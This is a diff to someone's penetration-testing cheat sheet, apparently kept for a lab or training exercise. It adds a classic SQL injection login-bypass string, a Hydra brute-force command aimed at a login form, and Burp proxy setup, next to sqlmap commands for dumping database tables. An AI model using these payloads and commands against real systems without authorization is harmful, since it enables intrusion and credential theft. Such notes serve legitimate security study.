@@ -37,13 +37,24 @@ Standard Gobuster scan used
 ### ```sqlmap -u "http://<url>/" -D <database> -T <table> --columns```
 ### ```sqlmap -u "http://<url>/" -D <database> -T <table> --dump```
 
+### ```‘ or 1=1; – -```
+
+
+## Hydra
+### ```hydra <http://<url>> "/login.php:username=^USER^&password=^PASS^:invalid credentials" -L usernames.txt -P passwords.txt -f -V```
+
+
+## Burpsuite
+### ```Setup burp on browser. HTTP Proxy: 127.0.0.1	Port: 8080```
+
+
+## ```ftp <ip>```
+
 
 ## Other tools that I forgot to take notes on during the test:
 ### Metasploit
-### Burpsuite
 ### Wireshark
-### ```ftp <ip>```
+### smbclient
 ### enum4linux 
-### Hydra
 ### Jon the Ripper
 
